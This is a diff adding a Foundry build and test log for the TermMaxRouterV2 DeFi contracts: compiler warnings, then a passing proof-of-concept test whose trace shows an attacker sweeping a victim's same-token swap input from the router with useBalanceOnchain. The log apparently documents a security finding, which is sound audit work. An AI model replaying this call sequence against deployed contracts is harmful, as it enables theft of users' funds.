@@ -1,0 +1,169 @@
+Compiling 2 files with Solc 0.8.27
+Solc 0.8.27 finished in 103.66s
+Compiler run successful with warnings:
+Warning (5740): Unreachable code.
+   --> dependencies/@openzeppelin-contracts-upgradeable-5.2.0/proxy/utils/Initializable.sol:128:9:
+    |
+128 |         if (isTopLevelCall) {
+    |         ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (6321): Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.
+   --> test/v2/utils/DeployUtils.sol:117:80:
+    |
+117 |     function deployMockTokens(Res memory res, address admin) internal returns (Res memory) {
+    |                                                                                ^^^^^^^^^^
+
+Warning (2072): Unused local variable.
+   --> contracts/v1/router/TermMaxRouter.sol:424:23:
+    |
+424 |         (IERC20 ft,,, address collateralAddr, IERC20 debtToken) = market.tokens();
+    |                       ^^^^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> contracts/v2/TermMaxOrderV2.sol:313:26:
+    |
+313 |     function updateOrder(OrderConfig memory newOrderConfig, int256 ftChangeAmt, int256 xtChangeAmt)
+    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> contracts/v2/TermMaxOrderV2.sol:313:61:
+    |
+313 |     function updateOrder(OrderConfig memory newOrderConfig, int256 ftChangeAmt, int256 xtChangeAmt)
+    |                                                             ^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> contracts/v2/TermMaxOrderV2.sol:313:81:
+    |
+313 |     function updateOrder(OrderConfig memory newOrderConfig, int256 ftChangeAmt, int256 xtChangeAmt)
+    |                                                                                 ^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> contracts/v2/TermMaxOrderV2.sol:456:30:
+    |
+456 |     function updateFeeConfig(FeeConfig memory newFeeConfig) external virtual override onlyMarket {
+    |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> contracts/v2/access/AccessManagerV2.sol:144:27:
+    |
+144 |     function renounceRole(bytes32 role, address callerConfirmation) public override {
+    |                           ^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> contracts/v2/access/AccessManagerV2.sol:144:41:
+    |
+144 |     function renounceRole(bytes32 role, address callerConfirmation) public override {
+    |                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> contracts/v2/test/MockAave.sol:65:21:
+   |
+65 |     function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
+   |                     ^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> contracts/v2/test/MockAave.sol:65:36:
+   |
+65 |     function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
+   |                                    ^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> contracts/v2/test/MockAave.sol:65:52:
+   |
+65 |     function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
+   |                                                    ^^^^^^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> contracts/v2/test/MockAave.sol:65:78:
+   |
+65 |     function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
+   |                                                                              ^^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+  --> contracts/v2/test/MockAave.sol:65:99:
+   |
+65 |     function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
+   |                                                                                                   ^^^^^^^^^^^^^^^^^^
+
+Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
+   --> test/v2/utils/DeployUtils.sol:168:82:
+    |
+168 |     function deployVaultFactory(address accessManager, address whitelistManager, address admin)
+    |                                                                                  ^^^^^^^^^^^^^
+
+Warning (2072): Unused local variable.
+   --> test/v2/RouterV2.t.sol:493:24:
+    |
+493 |         (uint256 gtId, uint256 netXtOut) =
+    |                        ^^^^^^^^^^^^^^^^
+
+Warning (2018): Function state mutability can be restricted to pure
+   --> contracts/v2/access/AccessManagerV2.sol:144:5:
+    |
+144 |     function renounceRole(bytes32 role, address callerConfirmation) public override {
+    |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2018): Function state mutability can be restricted to pure
+  --> contracts/v2/test/MockAave.sol:65:5:
+   |
+65 |     function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf)
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for test/security/RouterSameTokenBalanceSweep.t.sol:RouterSameTokenBalanceSweepPoC
+[PASS] test_PoC_sameTokenInputCanBeSweptByAnotherCaller() (gas: 281472)
+Traces:
+  [301472] RouterSameTokenBalanceSweepPoC::test_PoC_sameTokenInputCanBeSweptByAnotherCaller()
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
+    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::startPrank(0xcfA3Cad33e559DcE1cBf6d7bCeEa7dFAF64978ee)
+    │   └─ ← [Return]
+    ├─ [50973] MockERC20::mint(0xcfA3Cad33e559DcE1cBf6d7bCeEa7dFAF64978ee, 10000000000 [1e10])
+    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0xcfA3Cad33e559DcE1cBf6d7bCeEa7dFAF64978ee, amount: 10000000000 [1e10])
+    │   └─ ← [Stop]
+    ├─ [45933] MockERC20::approve(ERC1967Proxy: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 10000000000 [1e10])
+    │   ├─ emit Approval(owner: 0xcfA3Cad33e559DcE1cBf6d7bCeEa7dFAF64978ee, spender: ERC1967Proxy: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 10000000000 [1e10])
+    │   └─ ← [Return] true
+    ├─ [66004] ERC1967Proxy::fallback([SwapPath({ inputAmount: 10000000000 [1e10], recipient: 0xcfA3Cad33e559DcE1cBf6d7bCeEa7dFAF64978ee, useBalanceOnchain: false, units: [SwapUnit({ adapter: 0x0000000000000000000000000000000000000000, tokenIn: 0xEEC64849C44d0cf5263dd89D5fcDb4F3E8850501, tokenOut: 0xEEC64849C44d0cf5263dd89D5fcDb4F3E8850501, swapData: 0x })] })])
+    │   ├─ [49805] TermMaxRouterV2::swapTokens([SwapPath({ inputAmount: 10000000000 [1e10], recipient: 0xcfA3Cad33e559DcE1cBf6d7bCeEa7dFAF64978ee, useBalanceOnchain: false, units: [SwapUnit({ adapter: 0x0000000000000000000000000000000000000000, tokenIn: 0xEEC64849C44d0cf5263dd89D5fcDb4F3E8850501, tokenOut: 0xEEC64849C44d0cf5263dd89D5fcDb4F3E8850501, swapData: 0x })] })]) [delegatecall]
+    │   │   ├─ [35023] MockERC20::transferFrom(0xcfA3Cad33e559DcE1cBf6d7bCeEa7dFAF64978ee, ERC1967Proxy: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 10000000000 [1e10])
+    │   │   │   ├─ emit Transfer(from: 0xcfA3Cad33e559DcE1cBf6d7bCeEa7dFAF64978ee, to: ERC1967Proxy: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 10000000000 [1e10])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] [10000000000 [1e10]]
+    │   └─ ← [Return] [10000000000 [1e10]]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [2537] MockERC20::balanceOf(0xcfA3Cad33e559DcE1cBf6d7bCeEa7dFAF64978ee) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "victim input was pulled") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2537] MockERC20::balanceOf(ERC1967Proxy: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   └─ ← [Return] 10000000000 [1e10]
+    ├─ [0] VM::assertEq(10000000000 [1e10], 10000000000 [1e10], "input remained in router") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [66474] ERC1967Proxy::fallback([SwapPath({ inputAmount: 0, recipient: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, useBalanceOnchain: true, units: [SwapUnit({ adapter: 0x0000000000000000000000000000000000000000, tokenIn: 0xEEC64849C44d0cf5263dd89D5fcDb4F3E8850501, tokenOut: 0xCFb4911DD6e3B215250116Dcd614d6cc70BdaA46, swapData: 0x })] })])
+    │   ├─ [45511] TermMaxRouterV2::swapTokens([SwapPath({ inputAmount: 0, recipient: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e, useBalanceOnchain: true, units: [SwapUnit({ adapter: 0x0000000000000000000000000000000000000000, tokenIn: 0xEEC64849C44d0cf5263dd89D5fcDb4F3E8850501, tokenOut: 0xCFb4911DD6e3B215250116Dcd614d6cc70BdaA46, swapData: 0x })] })]) [delegatecall]
+    │   │   ├─ [2537] MockERC20::balanceOf(ERC1967Proxy: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   │   └─ ← [Return] 10000000000 [1e10]
+    │   │   ├─ [27630] MockERC20::transfer(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 10000000000 [1e10])
+    │   │   │   ├─ emit Transfer(from: ERC1967Proxy: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 10000000000 [1e10])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] [10000000000 [1e10]]
+    │   └─ ← [Return] [10000000000 [1e10]]
+    ├─ [2537] MockERC20::balanceOf(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Return] 10000000000 [1e10]
+    ├─ [0] VM::assertEq(10000000000 [1e10], 10000000000 [1e10], "attacker swept victim funds") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2537] MockERC20::balanceOf(ERC1967Proxy: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "router was drained") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 46.93ms (1.48ms CPU time)
+
+Ran 1 test suite in 160.43ms (46.93ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
